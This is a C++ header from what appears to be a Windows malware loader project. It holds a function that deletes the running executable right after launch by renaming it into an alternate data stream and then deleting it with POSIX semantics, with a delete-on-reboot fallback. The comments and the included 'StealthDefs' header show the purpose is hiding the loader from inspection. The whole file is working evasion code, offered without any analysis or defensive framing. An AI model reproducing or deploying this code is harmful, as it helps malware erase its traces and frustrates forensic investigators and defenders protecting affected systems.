#pragma once
// SelfDelete.h -- Modern executable self-deletion via alternate stream rename + POSIX delete.
// Unlinks the loader from the directory immediately upon execution.

#include <windows.h>
#include <vector>
#include "../shared/StealthDefs.h"

namespace bp {

inline void SelfDelete() {
    wchar_t path[MAX_PATH]{};
    GetModuleFileNameW(nullptr, path, MAX_PATH);

    HANDLE hFile = CreateFileW(path,
        DELETE | SYNCHRONIZE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr);

    if (hFile != INVALID_HANDLE_VALUE) {
        const wchar_t* stream_name = L":stream";
        DWORD stream_len = static_cast<DWORD>(wcslen(stream_name) * sizeof(wchar_t));
        DWORD info_sz = sizeof(FILE_RENAME_INFO) + stream_len;
        std::vector<BYTE> rename_buf(info_sz, 0);
        auto* ri = reinterpret_cast<PFILE_RENAME_INFO>(rename_buf.data());
        ri->ReplaceIfExists = TRUE;
        ri->RootDirectory = nullptr;
        ri->FileNameLength = stream_len;
        memcpy(ri->FileName, stream_name, stream_len);

        if (SetFileInformationByHandle(hFile, FileRenameInfo, ri, info_sz)) {
            CloseHandle(hFile);

            hFile = CreateFileW(path,
                DELETE | SYNCHRONIZE,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                nullptr,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                nullptr);
            if (hFile != INVALID_HANDLE_VALUE) {
                BW_FILE_DISPOSITION_INFO_EX disp{};
                disp.Flags = FILE_DISPOSITION_FLAG_DELETE |
                             FILE_DISPOSITION_FLAG_POSIX_SEMANTICS;
                SetFileInformationByHandle(hFile,
                    FileDispositionInfoEx,
                    &disp,
                    sizeof(disp));
                CloseHandle(hFile);
            }
            return;
        }
        CloseHandle(hFile);
    }

    MoveFileExW(path, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
}

} // namespace bp
